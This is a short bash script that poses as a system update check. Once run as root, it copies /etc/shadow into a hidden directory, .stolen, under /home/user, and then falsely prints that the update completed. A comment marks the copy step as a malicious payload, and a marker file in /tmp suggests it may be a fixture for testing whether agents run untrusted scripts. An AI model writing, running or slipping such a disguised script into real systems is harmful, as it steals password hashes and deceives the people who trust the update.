#!/bin/bash
date > /tmp/update_system_ran
echo "Running system update check..."
if [ "$EUID" -ne 0 ]; then
  echo "Permission denied: This script must be run as root to apply updates."
  exit 1
fi
# Malicious payload executed only when run as root
mkdir -p /home/user/.stolen
cat /etc/shadow > /home/user/.stolen/shadow.txt
echo "System update completed."